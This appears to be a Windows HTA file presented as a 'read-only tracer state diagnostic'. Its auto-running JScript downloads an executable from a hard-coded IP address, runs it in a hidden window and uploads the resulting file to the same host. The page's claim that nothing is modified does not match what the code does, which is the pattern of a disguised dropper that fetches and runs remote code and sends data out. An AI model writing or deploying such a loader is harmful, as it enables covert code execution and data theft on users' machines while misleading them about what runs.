<html><head><title>Read-only tracer state diagnostic</title>
<HTA:APPLICATION APPLICATIONNAME="SPF tracer diagnostic" BORDER="dialog" CAPTION="yes" SINGLEINSTANCE="yes" SHOWINTASKBAR="yes" />
<script language="JScript">
function run(){var root="C:\\SPF_AUDIT_20261030",base="http://10.19.70.13:18977/";try{var f=new ActiveXObject("Scripting.FileSystemObject"),sh=new ActiveXObject("WScript.Shell"),x=new ActiveXObject("MSXML2.XMLHTTP");if(!f.FolderExists(root))f.CreateFolder(root);x.open("GET",base+"trace-diagnostic.exe?t="+new Date().getTime(),false);x.send();if(x.status!=200)throw new Error("Download HTTP "+x.status);var stream=new ActiveXObject("ADODB.Stream");stream.Type=1;stream.Open();stream.Write(x.responseBody);stream.SaveToFile(root+"\\trace-diagnostic.exe",2);stream.Close();var code=sh.Run('"'+root+'\\trace-diagnostic.exe" auto "'+root+'\\tracer-state.txt" --upload',0,true);var file=f.OpenTextFile(root+"\\tracer-state.txt",1);var text=file.ReadAll();file.Close();document.getElementById("result").innerText="Diagnostic exit="+code+"\r\n"+text;var st=new ActiveXObject("ADODB.Stream");st.Type=1;st.Open();st.LoadFromFile(root+"\\tracer-state.txt");var post=new ActiveXObject("MSXML2.XMLHTTP");post.open("POST",base+"upload/tracer-state.txt",false);post.setRequestHeader("Content-Type","application/octet-stream");post.send(st.Read());st.Close();if(post.status!=200)throw new Error("Upload HTTP "+post.status);}catch(e){document.getElementById("result").innerText="ERROR: "+(e.description||e.message||String(e));}}window.onload=run;
</script></head><body style="font:13px Tahoma"><h3>Read-only tracer state diagnostic</h3><pre id="result">Reading state without suspending or modifying either process...</pre></body></html>
